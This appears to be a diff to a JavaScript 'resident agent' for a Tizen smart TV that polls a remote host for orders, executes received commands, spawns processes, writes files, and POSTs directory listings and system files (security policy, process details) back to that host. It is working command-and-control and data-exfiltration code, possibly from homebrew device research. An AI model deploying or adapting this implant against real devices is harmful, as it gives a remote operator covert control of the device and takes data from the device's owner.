@@ -1,4 +1,4 @@
-/* TV Recon v8 — LONG-LIVED RESIDENT AGENT.
+/* TV Recon v9 — LONG-LIVED RESIDENT AGENT.
  * Runs in the TizenBrew service vm context. No crash markers, no throws —
  * a single resident module with a polling loop. Orders from /mode:
  *   {"action":"recon"}   light status posts
@@ -16,9 +16,10 @@ var lastModeStr = '';
 var executedNonces = {};
 var busy = false;
 
+var AGENT_ID = T(function () { return fs.readFileSync('/proc/self/cmdline', 'utf8').split(' ')[0]; }) + ':' + process.pid;
 function post(tag, data) {
     try {
-        var body = JSON.stringify({ tag: tag, data: data });
+        var body = JSON.stringify({ tag: tag, agent: AGENT_ID, data: data });
         if (body.length > 400000) body = JSON.stringify({ tag: tag, data: '(too big)' });
         var req = http.request({
             host: MAC, port: PORT, path: '/report', method: 'POST',
@@ -32,8 +33,8 @@ function T(fn) { try { return fn(); } catch (e) { return 'ERR:' + (e && e.messag
 function read(f, n) { return T(function () { return fs.readFileSync(f, 'utf8').slice(0, n || 6000); }); }
 function ls(d) { return T(function () { return fs.readdirSync(d).slice(0, 250); }); }
 
-console.log('TV Recon v8 resident agent starting');
-post('v8-online', { time: new Date().toISOString(), uid: process.getuid(), node: process.version });
+console.log('TV Recon v9 resident agent starting');
+post('v9-online', { time: new Date().toISOString(), uid: process.getuid(), node: process.version });
 
 function getMode(cb) {
     try {
@@ -74,6 +75,9 @@ function doRecon(mode) {
          '/opt/usr/apps', '/var/cynara', '/var/lib', '/etc/sysmgr'].forEach(function (d) {
             post('fs', { dir: d, listing: ls(d) });
         });
+    });
+    once('marker', function () {
+        post('native-marker-unconditional', read('/tmp/.nativenow', 2000));
     });
     once('smack', function () {
         post('smack-load2', read('/sys/fs/smackfs/load2', 16000));
@@ -263,15 +267,21 @@ function tick() {
                     lastModeStr = ms;
                     post('mode', mode);
                 }
-                /* ONE-SHOT: every action carries a unique nonce; execute once. */
+                /* ONE-SHOT: nonce guard — skip dispatch but ALWAYS reschedule */
                 var nonce = mode.nonce || null;
-                if (nonce && executedNonces[nonce]) {
-                    if (mode.action !== 'exec' && mode.action !== 'spawn') {
-                        /* already ran this nonce — fall back to heartbeat only */
-                        return;
+                var alreadyRan = false;
+                if (nonce) {
+                    if (executedNonces[nonce]) { alreadyRan = true; }
+                    else {
+                        /* cross-agent file lock in shared /tmp */
+                        var lock = '/tmp/.lock_' + nonce;
+                        try {
+                            fs.openSync(lock, 'wx');
+                            executedNonces[nonce] = 1;
+                        } catch (e) { alreadyRan = true; }
                     }
                 }
-                if (nonce) executedNonces[nonce] = 1;
+                if (!alreadyRan) {
                 if (mode.action === 'exec') doExec(mode);
                 else if (mode.action === 'spawn') doSpawn(mode);
                 else if (mode.action === 'writefile') doWritefile(mode);
@@ -279,6 +289,7 @@ function tick() {
                 else if (mode.action === 'die') { post('dying', true); setTimeout(function () { throw new Error('UPDATE_RESTART'); }, 100); }
                 else if (mode.action === 'stop') { /* idle */ }
                 else doRecon(mode);
+                }
             } catch (e) { post('tick-err', String(e)); }
             setTimeout(tick, 5000);
         });
